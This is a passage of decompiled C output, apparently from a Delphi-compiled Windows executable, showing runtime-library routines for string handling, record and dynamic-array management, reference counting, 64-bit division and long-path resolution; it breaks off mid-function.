void FUN_00405050(uint param_1,int param_2,UINT param_3,BSTR *param_4)

{
  uint uVar1;
  UINT UVar2;
  uint uVar3;
  
  uVar1 = FUN_00404fc0(param_1);
  if (param_2 < 1) {
    uVar3 = 0;
  }
  else {
    uVar3 = param_2 - 1U;
    if ((int)uVar1 < (int)(param_2 - 1U)) {
      uVar3 = uVar1;
    }
  }
  if ((int)param_3 < 0) {
    UVar2 = 0;
  }
  else {
    UVar2 = uVar1 - uVar3;
    if ((int)param_3 < (int)(uVar1 - uVar3)) {
      UVar2 = param_3;
    }
  }
  FUN_00404f40(param_4,(OLECHAR *)(uVar3 * 2 + param_1),UVar2);
  return;
}



void FUN_0040509c(BSTR *param_1,UINT param_2)

{
  uint uVar1;
  undefined4 *puVar2;
  
  puVar2 = (undefined4 *)0x0;
  if (0 < (int)param_2) {
    puVar2 = (undefined4 *)FUN_00404e2c(param_2);
    uVar1 = FUN_00404fc0((uint)*param_1);
    if (0 < (int)uVar1) {
      if ((int)param_2 < (int)uVar1) {
        uVar1 = param_2;
      }
      FUN_0040285c((undefined4 *)*param_1,puVar2,uVar1 * 2);
    }
  }
  FUN_00404e44(param_1,(BSTR)puVar2);
  return;
}



void FUN_004050e0(OLECHAR **param_1)

{
  OLECHAR *strIn;
  BSTR pOVar1;
  
  strIn = *param_1;
  if (strIn != (OLECHAR *)0x0) {
    pOVar1 = SysAllocStringLen(strIn,*(uint *)(strIn + -2) >> 1);
    if (pOVar1 == (BSTR)0x0) {
      FUN_004027b0(1);
      return;
    }
    *param_1 = pOVar1;
  }
  return;
}



void FUN_00405100(int param_1,int param_2)

{
  bool bVar1;
  undefined4 *puVar2;
  int iVar3;
  int iVar4;
  
  puVar2 = (undefined4 *)(*(byte *)(param_2 + 1) + 10 + param_2);
  iVar3 = *(int *)(*(byte *)(param_2 + 1) + 6 + param_2);
  do {
    FUN_00405130((undefined4 *)(puVar2[1] + param_1),*(char **)*puVar2,1);
    puVar2 = puVar2 + 2;
    iVar4 = iVar3 + -1;
    bVar1 = 0 < iVar3;
    iVar3 = iVar4;
  } while (iVar4 != 0 && bVar1);
  return;
}



void FUN_00405130(undefined4 *param_1,char *param_2,int param_3)

{
  char cVar1;
  bool bVar2;
  uint uVar3;
  int iVar4;
  int iVar5;
  
  if (param_3 == 0) {
    return;
  }
  cVar1 = *param_2;
  uVar3 = (uint)(byte)param_2[1];
  if ((cVar1 != '\n') && (cVar1 != '\v')) {
    if (cVar1 == '\f') {
      do {
        *param_1 = 0;
        param_1[1] = 0;
        param_1[2] = 0;
        param_1[3] = 0;
        param_1 = param_1 + 4;
        iVar4 = param_3 + -1;
        bVar2 = 0 < param_3;
        param_3 = iVar4;
      } while (iVar4 != 0 && bVar2);
      return;
    }
    if (cVar1 == '\r') {
      do {
        iVar4 = *(int *)(param_2 + uVar3 + 2);
        FUN_00405130(param_1,**(char ***)(param_2 + uVar3 + 10),*(int *)(param_2 + uVar3 + 6));
        iVar5 = param_3 + -1;
        bVar2 = 0 < param_3;
        param_1 = (undefined4 *)((int)param_1 + iVar4);
        param_3 = iVar5;
      } while (iVar5 != 0 && bVar2);
      return;
    }
    if (cVar1 == '\x0e') {
      do {
        iVar4 = *(int *)(param_2 + uVar3 + 2);
        FUN_00405100((int)param_1,(int)param_2);
        iVar5 = param_3 + -1;
        bVar2 = 0 < param_3;
        param_1 = (undefined4 *)((int)param_1 + iVar4);
        param_3 = iVar5;
      } while (iVar5 != 0 && bVar2);
      return;
    }
    if ((cVar1 != '\x0f') && (cVar1 != '\x11')) {
      FUN_004027b0(CONCAT31((int3)((uint)param_1 >> 8),2));
      return;
    }
  }
  do {
    *param_1 = 0;
    param_1 = param_1 + 1;
    iVar4 = param_3 + -1;
    bVar2 = 0 < param_3;
    param_3 = iVar4;
  } while (iVar4 != 0 && bVar2);
  return;
}



void FUN_004051c4(undefined4 *param_1,char *param_2)

{
  FUN_00405130(param_1,param_2,1);
  return;
}



int FUN_004051d0(int param_1,int param_2)

{
  bool bVar1;
  undefined4 *puVar2;
  int iVar3;
  int iVar4;
  
  puVar2 = (undefined4 *)(*(byte *)(param_2 + 1) + 10 + param_2);
  iVar3 = *(int *)(*(byte *)(param_2 + 1) + 6 + param_2);
  do {
    FUN_0040521c((int **)(puVar2[1] + param_1),*(char **)*puVar2,1);
    puVar2 = puVar2 + 2;
    iVar4 = iVar3 + -1;
    bVar1 = 0 < iVar3;
    iVar3 = iVar4;
  } while (iVar4 != 0 && bVar1);
  return param_1;
}



void FUN_00405204(undefined4 param_1)

{
  if (DAT_0043f010 != (code *)0x0) {
    (*DAT_0043f010)();
    return;
  }
  FUN_004027b0(CONCAT31((int3)((uint)param_1 >> 8),0x10));
  return;
}



int ** FUN_0040521c(int **param_1,char *param_2,int param_3)

{
  char cVar1;
  bool bVar2;
  int **ppiVar3;
  uint uVar4;
  int iVar5;
  int iVar6;
  
  if (param_3 != 0) {
    cVar1 = *param_2;
    uVar4 = (uint)(byte)param_2[1];
    if (cVar1 == '\n') {
      if (param_3 < 2) {
        FUN_004047a8((int *)param_1);
      }
      else {
        FUN_004047cc((int *)param_1,param_3);
      }
    }
    else if (cVar1 == '\v') {
      if (param_3 < 2) {
        FUN_00404e54((BSTR *)param_1);
      }
      else {
        FUN_00404e6c((BSTR *)param_1,param_3);
      }
    }
    else {
      ppiVar3 = param_1;
      if (cVar1 == '\f') {
        do {
          FUN_00405204(ppiVar3);
          iVar6 = param_3 + -1;
          bVar2 = 0 < param_3;
          ppiVar3 = ppiVar3 + 4;
          param_3 = iVar6;
        } while (iVar6 != 0 && bVar2);
      }
      else if (cVar1 == '\r') {
        do {
          iVar6 = *(int *)(param_2 + uVar4 + 2);
          FUN_0040521c(ppiVar3,**(char ***)(param_2 + uVar4 + 10),*(int *)(param_2 + uVar4 + 6));
          iVar5 = param_3 + -1;
          bVar2 = 0 < param_3;
          ppiVar3 = (int **)((int)ppiVar3 + iVar6);
          param_3 = iVar5;
        } while (iVar5 != 0 && bVar2);
      }
      else if (cVar1 == '\x0e') {
        do {
          iVar6 = *(int *)(param_2 + uVar4 + 2);
          FUN_004051d0((int)ppiVar3,(int)param_2);
          iVar5 = param_3 + -1;
          bVar2 = 0 < param_3;
          ppiVar3 = (int **)((int)ppiVar3 + iVar6);
          param_3 = iVar5;
        } while (iVar5 != 0 && bVar2);
      }
      else if (cVar1 == '\x0f') {
        do {
          FUN_004060f8(ppiVar3);
          iVar6 = param_3 + -1;
          bVar2 = 0 < param_3;
          ppiVar3 = ppiVar3 + 1;
          param_3 = iVar6;
        } while (iVar6 != 0 && bVar2);
      }
      else {
        if (cVar1 != '\x11') {
          ppiVar3 = (int **)FUN_004027b0(CONCAT31((int3)((uint)param_1 >> 8),2));
          return ppiVar3;
        }
        do {
          FUN_00405a48((int *)ppiVar3,(int)param_2);
          iVar6 = param_3 + -1;
          bVar2 = 0 < param_3;
          ppiVar3 = ppiVar3 + 1;
          param_3 = iVar6;
        } while (iVar6 != 0 && bVar2);
      }
    }
  }
  return param_1;
}



void FUN_00405308(int **param_1,char *param_2)

{
  FUN_0040521c(param_1,param_2,1);
  return;
}



void FUN_00405314(int param_1,int param_2)

{
  bool bVar1;
  undefined4 *puVar2;
  int iVar3;
  int iVar4;
  
  puVar2 = (undefined4 *)(*(byte *)(param_2 + 1) + 10 + param_2);
  iVar3 = *(int *)(*(byte *)(param_2 + 1) + 6 + param_2);
  do {
    FUN_0040535c((int **)(puVar2[1] + param_1),*(char **)*puVar2,1);
    puVar2 = puVar2 + 2;
    iVar4 = iVar3 + -1;
    bVar1 = 0 < iVar3;
    iVar3 = iVar4;
  } while (iVar4 != 0 && bVar1);
  return;
}



void FUN_00405344(undefined4 param_1)

{
  if (DAT_0043f014 != (code *)0x0) {
    (*DAT_0043f014)();
    return;
  }
  FUN_004027b0(CONCAT31((int3)((uint)param_1 >> 8),0x10));
  return;
}



void FUN_0040535c(int **param_1,char *param_2,int param_3)

{
  char cVar1;
  int *piVar2;
  bool bVar3;
  uint uVar4;
  int iVar5;
  int iVar6;
  
  if (param_3 != 0) {
    cVar1 = *param_2;
    uVar4 = (uint)(byte)param_2[1];
    if (cVar1 == '\n') {
      do {
        piVar2 = *param_1;
        param_1 = param_1 + 1;
        FUN_00404c58((int)piVar2);
        iVar6 = param_3 + -1;
        bVar3 = 0 < param_3;
        param_3 = iVar6;
      } while (iVar6 != 0 && bVar3);
    }
    else if (cVar1 == '\v') {
      do {
        FUN_004050e0((OLECHAR **)param_1);
        iVar6 = param_3 + -1;
        bVar3 = 0 < param_3;
        param_1 = param_1 + 1;
        param_3 = iVar6;
      } while (iVar6 != 0 && bVar3);
    }
    else if (cVar1 == '\f') {
      do {
        FUN_00405344(param_1);
        iVar6 = param_3 + -1;
        bVar3 = 0 < param_3;
        param_1 = param_1 + 4;
        param_3 = iVar6;
      } while (iVar6 != 0 && bVar3);
    }
    else if (cVar1 == '\r') {
      do {
        iVar6 = *(int *)(param_2 + uVar4 + 2);
        FUN_0040535c(param_1,**(char ***)(param_2 + uVar4 + 10),*(int *)(param_2 + uVar4 + 6));
        iVar5 = param_3 + -1;
        bVar3 = 0 < param_3;
        param_1 = (int **)((int)param_1 + iVar6);
        param_3 = iVar5;
      } while (iVar5 != 0 && bVar3);
    }
    else if (cVar1 == '\x0e') {
      do {
        iVar6 = *(int *)(param_2 + uVar4 + 2);
        FUN_00405314((int)param_1,(int)param_2);
        iVar5 = param_3 + -1;
        bVar3 = 0 < param_3;
        param_1 = (int **)((int)param_1 + iVar6);
        param_3 = iVar5;
      } while (iVar5 != 0 && bVar3);
    }
    else if (cVar1 == '\x0f') {
      do {
        piVar2 = *param_1;
        param_1 = param_1 + 1;
        FUN_0040613c(piVar2);
        iVar6 = param_3 + -1;
        bVar3 = 0 < param_3;
        param_3 = iVar6;
      } while (iVar6 != 0 && bVar3);
    }
    else {
      if (cVar1 != '\x11') {
        FUN_004027b0(CONCAT31((int3)((uint)param_1 >> 8),2));
        return;
      }
      do {
        piVar2 = *param_1;
        param_1 = param_1 + 1;
        FUN_00405aac((int)piVar2);
        iVar6 = param_3 + -1;
        bVar3 = 0 < param_3;
        param_3 = iVar6;
      } while (iVar6 != 0 && bVar3);
    }
  }
  return;
}



void FUN_0040541c(undefined4 param_1)

{
  if (DAT_0043f018 != (code *)0x0) {
    (*DAT_0043f018)();
    return;
  }
  FUN_004027b0(CONCAT31((int3)((uint)param_1 >> 8),0x10));
  return;
}



void FUN_00405434(int param_1,int param_2,int param_3)

{
  char cVar1;
  int iVar2;
  int iVar3;
  char *pcVar4;
  int iVar5;
  uint uVar6;
  int iVar7;
  undefined4 *puVar8;
  
  puVar8 = (undefined4 *)(*(byte *)(param_3 + 1) + 10 + param_3);
  iVar7 = puVar8[-1];
  iVar5 = 0;
  iVar2 = puVar8[-2];
  do {
    uVar6 = puVar8[1] - iVar5;
    if (uVar6 != 0 && iVar5 <= (int)puVar8[1]) {
      FUN_0040285c((undefined4 *)(iVar5 + param_2),(undefined4 *)(iVar5 + param_1),uVar6);
    }
    iVar3 = puVar8[1];
    pcVar4 = *(char **)*puVar8;
    cVar1 = *pcVar4;
    if (cVar1 == '\n') {
      FUN_004047fc((int *)(iVar3 + param_1),*(undefined4 **)(iVar3 + param_2));
      iVar5 = 4;
    }
    else if (cVar1 == '\v') {
      FUN_00404e90((BSTR *)(iVar3 + param_1),*(OLECHAR **)(iVar3 + param_2));
      iVar5 = 4;
    }
    else if (cVar1 == '\f') {
      FUN_0040541c(iVar3 + param_1);
      iVar5 = 0x10;
    }
    else if (cVar1 == '\r') {
      uVar6 = (uint)(byte)pcVar4[1];
      iVar5 = *(int *)(pcVar4 + uVar6 + 2);
      FUN_00405550((int **)(iVar3 + param_1),(OLECHAR **)(iVar3 + param_2),
                   **(char ***)(pcVar4 + uVar6 + 10),*(int *)(pcVar4 + uVar6 + 6));
    }
    else if (cVar1 == '\x0e') {
      iVar5 = *(int *)(pcVar4 + (byte)pcVar4[1] + 2);
      FUN_00405434(iVar3 + param_1,iVar3 + param_2,(int)pcVar4);
    }
    else if (cVar1 == '\x0f') {
      FUN_00406110((int **)(iVar3 + param_1),*(int ***)(iVar3 + param_2));
      iVar5 = 4;
    }
    else {
      if (cVar1 != '\x11') {
        FUN_004027b0(CONCAT31((int3)((uint)iVar3 >> 8),2));
        return;
      }
      FUN_00405a84((int *)(iVar3 + param_1),*(int *)(iVar3 + param_2),(int)pcVar4);
      iVar5 = 4;
    }
    iVar5 = iVar5 + puVar8[1];
    puVar8 = puVar8 + 2;
    iVar7 = iVar7 + -1;
  } while (iVar7 != 0);
  uVar6 = iVar2 - iVar5;
  if (uVar6 != 0 && iVar5 <= iVar2) {
    FUN_0040285c((undefined4 *)(iVar5 + param_2),(undefined4 *)(iVar5 + param_1),uVar6);
  }
  return;
}



void FUN_00405550(int **param_1,OLECHAR **param_2,char *param_3,int param_4)

{
  int *piVar1;
  char cVar2;
  
  cVar2 = *param_3;
  if (cVar2 == '\n') {
    do {
      FUN_004047fc((int *)param_1,(undefined4 *)*param_2);
      param_1 = param_1 + 1;
      param_2 = param_2 + 1;
      param_4 = param_4 + -1;
    } while (param_4 != 0);
  }
  else if (cVar2 == '\v') {
    do {
      FUN_00404e90((BSTR *)param_1,*param_2);
      param_1 = param_1 + 1;
      param_2 = param_2 + 1;
      param_4 = param_4 + -1;
    } while (param_4 != 0);
  }
  else if (cVar2 == '\f') {
    do {
      FUN_0040541c(param_1);
      param_1 = param_1 + 4;
      param_4 = param_4 + -1;
    } while (param_4 != 0);
  }
  else if (cVar2 == '\r') {
    piVar1 = (int *)(param_3 + (byte)param_3[1] + 2);
    do {
      FUN_00405550(param_1,param_2,(char *)piVar1[2],piVar1[1]);
      param_1 = (int **)((int)param_1 + *piVar1);
      param_2 = (OLECHAR **)((int)param_2 + *piVar1);
      param_4 = param_4 + -1;
    } while (param_4 != 0);
  }
  else if (cVar2 == '\x0e') {
    do {
      FUN_00405434((int)param_1,(int)param_2,(int)param_3);
      param_1 = (int **)((int)param_1 + *(int *)(param_3 + (byte)param_3[1] + 2));
      param_2 = (OLECHAR **)((int)param_2 + *(int *)(param_3 + (byte)param_3[1] + 2));
      param_4 = param_4 + -1;
    } while (param_4 != 0);
  }
  else if (cVar2 == '\x0f') {
    do {
      FUN_00406110(param_1,(int **)*param_2);
      param_1 = param_1 + 1;
      param_2 = param_2 + 1;
      param_4 = param_4 + -1;
    } while (param_4 != 0);
  }
  else {
    if (cVar2 != '\x11') {
      FUN_004027b0(CONCAT31((int3)((uint)param_1 >> 8),2));
      return;
    }
    do {
      FUN_00405a84((int *)param_1,(int)*param_2,(int)param_3);
      param_1 = param_1 + 1;
      param_2 = param_2 + 1;
      param_4 = param_4 + -1;
    } while (param_4 != 0);
  }
  return;
}



undefined4 * FUN_00405644(int param_1,char *param_2)

{
  undefined4 *puVar1;
  
  puVar1 = (undefined4 *)FUN_004026a8(param_1);
  if (puVar1 != (undefined4 *)0x0) {
    FUN_004051c4(puVar1,param_2);
  }
  return puVar1;
}



void FUN_00405658(int **param_1,char *param_2)

{
  FUN_00405308(param_1,param_2);
  FUN_004026c8((int)param_1);
  return;
}



int FUN_00405670(int param_1,undefined4 param_2,undefined4 param_3,int param_4)

{
  return param_1 * param_4;
}



int FUN_00405694(int param_1,uint param_2,undefined4 param_3,uint param_4,uint param_5)

{
  int iVar1;
  uint uVar2;
  uint uVar3;
  bool bVar4;
  bool bVar5;
  bool bVar6;
  
  if ((param_5 == 0) && ((param_2 == 0 || (param_4 == 0)))) {
    param_1 = (int)(CONCAT44(param_2,param_1) / (ulonglong)param_4);
  }
  else {
    bVar6 = (int)param_2 < 0;
    if (bVar6) {
      bVar4 = param_1 != 0;
      param_1 = -param_1;
      param_2 = -(uint)bVar4 - param_2;
    }
    if ((int)param_5 < 0) {
      bVar4 = param_4 != 0;
      param_4 = -param_4;
      param_5 = -(uint)bVar4 - param_5;
      bVar6 = !bVar6;
    }
    iVar1 = 0x40;
    uVar3 = 0;
    uVar2 = 0;
    do {
      bVar4 = param_1 < 0;
      param_1 = param_1 * 2;
      bVar5 = (int)param_2 < 0;
      param_2 = param_2 << 1 | (uint)bVar4;
      bVar4 = (int)uVar2 < 0;
      uVar2 = uVar2 << 1 | (uint)bVar5;
      uVar3 = uVar3 << 1 | (uint)bVar4;
      if ((param_5 <= uVar3) && ((param_5 < uVar3 || (param_4 <= uVar2)))) {
        bVar4 = uVar2 < param_4;
        uVar2 = uVar2 - param_4;
        uVar3 = (uVar3 - param_5) - (uint)bVar4;
        param_1 = param_1 + 1;
      }
      iVar1 = iVar1 + -1;
    } while (iVar1 != 0);
    if (bVar6) {
      param_1 = -param_1;
    }
  }
  return param_1;
}



uint FUN_00405710(int param_1,uint param_2,undefined4 param_3,uint param_4,uint param_5)

{
  int iVar1;
  uint uVar2;
  uint uVar3;
  bool bVar4;
  bool bVar5;
  bool bVar6;
  
  if ((param_5 == 0) && ((param_2 == 0 || (param_4 == 0)))) {
    uVar2 = (uint)(CONCAT44(param_2,param_1) % (ulonglong)param_4);
  }
  else {
    bVar6 = (int)param_2 < 0;
    if (bVar6) {
      bVar4 = param_1 != 0;
      param_1 = -param_1;
      param_2 = -(uint)bVar4 - param_2;
    }
    if ((int)param_5 < 0) {
      bVar4 = param_4 != 0;
      param_4 = -param_4;
      param_5 = -(uint)bVar4 - param_5;
    }
    iVar1 = 0x40;
    uVar3 = 0;
    uVar2 = 0;
    do {
      bVar4 = param_1 < 0;
      param_1 = param_1 * 2;
      bVar5 = (int)param_2 < 0;
      param_2 = param_2 << 1 | (uint)bVar4;
      bVar4 = (int)uVar2 < 0;
      uVar2 = uVar2 << 1 | (uint)bVar5;
      uVar3 = uVar3 << 1 | (uint)bVar4;
      if ((param_5 <= uVar3) && ((param_5 < uVar3 || (param_4 <= uVar2)))) {
        bVar4 = uVar2 < param_4;
        uVar2 = uVar2 - param_4;
        uVar3 = (uVar3 - param_5) - (uint)bVar4;
        param_1 = param_1 + 1;
      }
      iVar1 = iVar1 + -1;
    } while (iVar1 != 0);
    if (bVar6) {
      uVar2 = -uVar2;
    }
  }
  return uVar2;
}



int FUN_0040578c(int param_1)

{
  if (param_1 != 0) {
    param_1 = *(int *)(param_1 + -4);
  }
  return param_1;
}



int FUN_00405794(int param_1)

{
  int iVar1;
  
  iVar1 = FUN_0040578c(param_1);
  return iVar1 + -1;
}



void FUN_0040579c(int **param_1,OLECHAR **param_2,char *param_3,int param_4)

{
  FUN_00405550(param_1,param_2,param_3,param_4);
  return;
}



int ** thunk_FUN_0040521c(int **param_1,char *param_2,int param_3)

{
  char cVar1;
  bool bVar2;
  int **ppiVar3;
  uint uVar4;
  int iVar5;
  int iVar6;
  
  if (param_3 != 0) {
    cVar1 = *param_2;
    uVar4 = (uint)(byte)param_2[1];
    if (cVar1 == '\n') {
      if (param_3 < 2) {
        FUN_004047a8((int *)param_1);
      }
      else {
        FUN_004047cc((int *)param_1,param_3);
      }
    }
    else if (cVar1 == '\v') {
      if (param_3 < 2) {
        FUN_00404e54((BSTR *)param_1);
      }
      else {
        FUN_00404e6c((BSTR *)param_1,param_3);
      }
    }
    else {
      ppiVar3 = param_1;
      if (cVar1 == '\f') {
        do {
          FUN_00405204(ppiVar3);
          iVar6 = param_3 + -1;
          bVar2 = 0 < param_3;
          ppiVar3 = ppiVar3 + 4;
          param_3 = iVar6;
        } while (iVar6 != 0 && bVar2);
      }
      else if (cVar1 == '\r') {
        do {
          iVar6 = *(int *)(param_2 + uVar4 + 2);
          FUN_0040521c(ppiVar3,**(char ***)(param_2 + uVar4 + 10),*(int *)(param_2 + uVar4 + 6));
          iVar5 = param_3 + -1;
          bVar2 = 0 < param_3;
          ppiVar3 = (int **)((int)ppiVar3 + iVar6);
          param_3 = iVar5;
        } while (iVar5 != 0 && bVar2);
      }
      else if (cVar1 == '\x0e') {
        do {
          iVar6 = *(int *)(param_2 + uVar4 + 2);
          FUN_004051d0((int)ppiVar3,(int)param_2);
          iVar5 = param_3 + -1;
          bVar2 = 0 < param_3;
          ppiVar3 = (int **)((int)ppiVar3 + iVar6);
          param_3 = iVar5;
        } while (iVar5 != 0 && bVar2);
      }
      else if (cVar1 == '\x0f') {
        do {
          FUN_004060f8(ppiVar3);
          iVar6 = param_3 + -1;
          bVar2 = 0 < param_3;
          ppiVar3 = ppiVar3 + 1;
          param_3 = iVar6;
        } while (iVar6 != 0 && bVar2);
      }
      else {
        if (cVar1 != '\x11') {
          ppiVar3 = (int **)FUN_004027b0(CONCAT31((int3)((uint)param_1 >> 8),2));
          return ppiVar3;
        }
        do {
          FUN_00405a48((int *)ppiVar3,(int)param_2);
          iVar6 = param_3 + -1;
          bVar2 = 0 < param_3;
          ppiVar3 = ppiVar3 + 1;
          param_3 = iVar6;
        } while (iVar6 != 0 && bVar2);
      }
    }
  }
  return param_1;
}



void FUN_004057b4(int *param_1,int param_2)

{
  FUN_00405a48(param_1,param_2);
  return;
}



void FUN_004057bc(int **param_1,int param_2,int param_3,int *param_4)

{
  char **ppcVar1;
  int *piVar2;
  int iVar3;
  char *pcVar4;
  int iVar5;
  int *local_24;
  int local_20;
  int local_1c;
  int local_18;
  int local_14;
  int local_10;
  int local_c;
  int **local_8;
  
  piVar2 = *param_1;
  iVar5 = *param_4;
  local_c = param_3;
  local_8 = param_1;
  if (iVar5 < 1) {
    if (iVar5 < 0) {
      FUN_004027b0(CONCAT31((int3)((uint)param_4 >> 8),4));
    }
    FUN_004057b4((int *)local_8,param_2);
  }
  else {
    local_14 = 0;
    if (piVar2 != (int *)0x0) {
      local_14 = piVar2[-1];
      piVar2 = piVar2 + -2;
    }
    iVar3 = param_2 + (uint)*(byte *)(param_2 + 1);
    local_1c = *(int *)(iVar3 + 2);
    ppcVar1 = *(char ***)(iVar3 + 6);
    if (ppcVar1 == (char **)0x0) {
      pcVar4 = (char *)0x0;
    }
    else {
      pcVar4 = *ppcVar1;
    }
    local_20 = iVar5 * local_1c;
    if (local_20 / iVar5 != local_1c) {
      FUN_004027b0(CONCAT31((int3)((uint)(local_20 / iVar5) >> 8),4));
    }
    local_20 = local_20 + 8;
    if ((piVar2 == (int *)0x0) || (*piVar2 == 1)) {
      local_24 = piVar2;
      if ((iVar5 < local_14) && (pcVar4 != (char *)0x0)) {
        thunk_FUN_0040521c((int **)((int)piVar2 + iVar5 * local_1c + 8),pcVar4,local_14 - iVar5);
      }
      FUN_004026e8((int *)&local_24,local_20);
      piVar2 = local_24;
    }
    else {
      *piVar2 = *piVar2 + -1;
      piVar2 = (int *)FUN_004026a8(local_20);
      local_18 = local_14;
      if (iVar5 < local_14) {
        local_18 = iVar5;
      }
      if (pcVar4 == (char *)0x0) {
        FUN_0040285c(*local_8,piVar2 + 2,local_18 * local_1c);
      }
      else {
        FUN_004030a0(piVar2 + 2,local_18 * local_1c,0);
        FUN_0040579c((int **)(piVar2 + 2),(OLECHAR **)*local_8,pcVar4,local_18);
      }
    }
    *piVar2 = 1;
    piVar2[1] = iVar5;
    piVar2 = piVar2 + 2;
    FUN_004030a0((int *)(local_1c * local_14 + (int)piVar2),(iVar5 - local_14) * local_1c,0);
    if (1 < local_c) {
      local_c = local_c + -1;
      if (-1 < iVar5 + -1) {
        local_10 = 0;
        do {
          FUN_004057bc((int **)(piVar2 + local_10),(int)pcVar4,local_c,param_4 + 1);
          local_10 = local_10 + 1;
          iVar5 = iVar5 + -1;
        } while (iVar5 != 0);
      }
    }
    *local_8 = piVar2;
  }
  return;
}



void FUN_00405948(int **param_1,int param_2,int param_3)

{
  FUN_004057bc(param_1,param_2,param_3,(int *)&stack0x00000004);
  return;
}



void FUN_00405954(int param_1,int param_2,int param_3,int *param_4,int param_5)

{
  int iVar1;
  int iVar2;
  char **ppcVar3;
  OLECHAR **ppOVar4;
  undefined4 *puVar5;
  int **ppiVar6;
  char *local_14;
  
  ppiVar6 = (int **)0x0;
  if (param_1 != 0) {
    if (param_3 < 0) {
      param_5 = param_5 + param_3;
      param_3 = 0;
    }
    iVar1 = *(int *)(param_1 + -4);
    if (iVar1 < param_3) {
      param_3 = iVar1;
    }
    if (iVar1 - param_3 < param_5) {
      param_5 = iVar1 - param_3;
    }
    if (param_5 < 0) {
      param_5 = 0;
    }
    if (0 < param_5) {
      iVar1 = param_2 + (uint)*(byte *)(param_2 + 1);
      iVar2 = *(int *)(iVar1 + 2);
      ppcVar3 = *(char ***)(iVar1 + 6);
      if (ppcVar3 == (char **)0x0) {
        local_14 = (char *)0x0;
      }
      else {
        local_14 = *ppcVar3;
      }
      puVar5 = (undefined4 *)FUN_004026a8(param_5 * iVar2 + 8);
      *puVar5 = 1;
      puVar5[1] = param_5;
      ppiVar6 = (int **)(puVar5 + 2);
      ppOVar4 = (OLECHAR **)(param_1 + param_3 * iVar2);
      if (0 < param_5) {
        if (local_14 == (char *)0x0) {
          FUN_0040285c(ppOVar4,ppiVar6,param_5 * iVar2);
        }
        else {
          FUN_004030a0(ppiVar6,param_5 * iVar2,0);
          FUN_0040579c(ppiVar6,ppOVar4,local_14,param_5);
        }
      }
    }
  }
  FUN_004057b4(param_4,param_2);
  *param_4 = (int)ppiVar6;
  return;
}



int * FUN_00405a48(int *param_1,int param_2)

{
  int **ppiVar1;
  char **ppcVar2;
  int **ppiVar3;
  
  ppiVar3 = (int **)*param_1;
  if (ppiVar3 != (int **)0x0) {
    *param_1 = 0;
    LOCK();
    ppiVar1 = ppiVar3 + -2;
    *ppiVar1 = (int *)((int)*ppiVar1 + -1);
    if (*ppiVar1 == (int *)0x0) {
      ppcVar2 = *(char ***)(*(byte *)(param_2 + 1) + 6 + param_2);
      if ((ppcVar2 != (char **)0x0) && (ppiVar3[-1] != (int *)0x0)) {
        ppiVar3 = FUN_0040521c(ppiVar3,*ppcVar2,(int)ppiVar3[-1]);
      }
      FUN_004026c8((int)(ppiVar3 + -2));
    }
  }
  return param_1;
}



void FUN_00405a84(int *param_1,int param_2,int param_3)

{
  int *piVar1;
  int iVar2;
  
  iVar2 = *param_1;
  if (param_2 != 0) {
    LOCK();
    *(int *)(param_2 + -8) = *(int *)(param_2 + -8) + 1;
  }
  if (iVar2 != 0) {
    LOCK();
    piVar1 = (int *)(iVar2 + -8);
    *piVar1 = *piVar1 + -1;
    if (*piVar1 == 0) {
      *(int *)(iVar2 + -8) = *(int *)(iVar2 + -8) + 1;
      FUN_00405a48(param_1,param_3);
    }
  }
  *param_1 = param_2;
  return;
}



void FUN_00405aac(int param_1)

{
  if (param_1 != 0) {
    LOCK();
    *(int *)(param_1 + -8) = *(int *)(param_1 + -8) + 1;
  }
  return;
}



PVOID FUN_00405ab8(LPCVOID param_1)

{
  _MEMORY_BASIC_INFORMATION local_1c;
  
  VirtualQuery(param_1,&local_1c,0x1c);
  if (local_1c.State != 0x1000) {
    local_1c.AllocationBase = (PVOID)0x0;
  }
  return local_1c.AllocationBase;
}



undefined4 FUN_00405ae0(int param_1)

{
  HMODULE pHVar1;
  CHAR local_110 [264];
  
  if (*(int *)(param_1 + 0x10) == 0) {
    GetModuleFileNameA(*(HMODULE *)(param_1 + 4),local_110,0x105);
    pHVar1 = FUN_00405d1c(local_110);
    *(HMODULE *)(param_1 + 0x10) = pHVar1;
    if (pHVar1 == (HMODULE)0x0) {
      *(undefined4 *)(param_1 + 0x10) = *(undefined4 *)(param_1 + 4);
    }
  }
  return *(undefined4 *)(param_1 + 0x10);
}



void FUN_00405b28(int param_1)

{
  int *piVar1;
  
  piVar1 = DAT_0043f03c;
  if (DAT_0043f03c != (int *)0x0) {
    do {
      if (((param_1 == piVar1[1]) || (param_1 == piVar1[2])) || (param_1 == piVar1[3])) {
        FUN_00405ae0((int)piVar1);
        return;
      }
      piVar1 = (int *)*piVar1;
    } while (piVar1 != (int *)0x0);
  }
  return;
}



void thunk_FUN_00405b58(LPCSTR param_1)

{
  for (; (*param_1 != '\0' && (*param_1 != '\\')); param_1 = CharNextA(param_1)) {
  }
  return;
}



void FUN_00405b58(LPCSTR param_1)

{
  for (; (*param_1 != '\0' && (*param_1 != '\\')); param_1 = CharNextA(param_1)) {
  }
  return;
}



char * FUN_00405b64(char *param_1,int param_2)

{
  HMODULE hModule;
  FARPROC pFVar1;
  int iVar2;
  char *pcVar3;
  LPCSTR pCVar4;
  HANDLE hFindFile;
  int iVar5;
  CHAR local_253 [261];
  undefined local_14e [322];
  int local_c;
  char *local_8;
  
  local_14e._318_4_ = param_1;
  local_c = param_2;
  local_8 = param_1;
  hModule = GetModuleHandleA("kernel32.dll");
  if (((hModule == (HMODULE)0x0) ||
      (pFVar1 = GetProcAddress(hModule,"GetLongPathNameA"), pFVar1 == (FARPROC)0x0)) ||
     (iVar2 = (*pFVar1)(), iVar2 == 0)) {
    if (*local_8 == '\\') {
      if (local_8[1] != '\\') {
        return local_14e._318_4_;
      }
      pcVar3 = (char *)thunk_FUN_00405b58(local_8 + 2);
      if (*pcVar3 == '\0') {
        return local_14e._318_4_;
      }
      pcVar3 = (char *)thunk_FUN_00405b58(pcVar3 + 1);
      if (*pcVar3 == '\0') {
        return local_14e._318_4_;
      }
    }
    else {
      pcVar3 = local_8 + 2;
    }
    iVar2 = (int)pcVar3 - (int)local_8;
    lstrcpynA(local_253,local_8,iVar2 + 1);
    while (*pcVar3 != '\0') {
      pCVar4 = (LPCSTR)thunk_FUN_00405b58(pcVar3 + 1);
      if (0x105 < (int)(pCVar4 + (iVar2 - (int)pcVar3) + 1)) {
        return local_14e._318_4_;
      }
      lstrcpynA(local_253 + iVar2,pcVar3,(int)(pCVar4 + (1 - (int)pcVar3)));
      hFindFile = FindFirstFileA(local_253,(LPWIN32_FIND_DATAA)local_14e);
